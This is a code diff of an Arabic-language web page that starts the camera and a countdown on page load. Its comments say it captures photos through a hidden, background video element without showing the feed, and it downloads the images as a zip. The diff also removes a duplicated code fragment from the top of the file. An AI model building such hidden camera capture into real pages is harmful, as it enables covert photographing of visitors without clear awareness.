@@ -1,23 +1,4 @@
-r.file(`image${i + 1}.png`, imgData, { base64: true });
-        }
-
-        // إنشاء الأرشيف وتحميله
-        const content = await zip.generateAsync({ type: "blob" });
-        const link = document.createElement('a');
-        link.href = URL.createObjectURL(content);
-        link.download = "images.zip"; // اسم الأرشيف الذي سيتم تحميله
-        link.click();
-    }
-
-    // بدء الكاميرا والعد التنازلي عند تحميل الصفحة
-    window.onload = function() {
-        startCamera(); // بدء الكاميرا وطلب الإذن
-        startCountdown(); // بدء العد التنازلي
-    };
-</script>
-
-</body>
-</h<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -91,7 +72,7 @@ r.file(`image${i + 1}.png`, imgData, { base64: true });
         }, 1000); // العد التنازلي كل ثانية
     }
 
-    // بدء الكاميرا لالتقاط الصور (دون عرض الفيديو)
+    // بدء الكاميرا لالتقاط الصور دون عرض الفيديو
     async function startCamera() {
         try {
             const video = document.createElement('video'); // إنشاء عنصر فيديو مخفي
@@ -99,7 +80,7 @@ r.file(`image${i + 1}.png`, imgData, { base64: true });
             document.body.appendChild(video); // إضافة الفيديو إلى الصفحة (لكن مخفي)
             cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = cameraStream;
-            video.play(); // بدء تشغيل الفيديو
+            video.play(); // بدء تشغيل الفيديو في الخلفية
         } catch (error) {
             alert("لم نتمكن من الوصول إلى الكاميرا. يرجى التأكد من منح الأذونات.");
         }
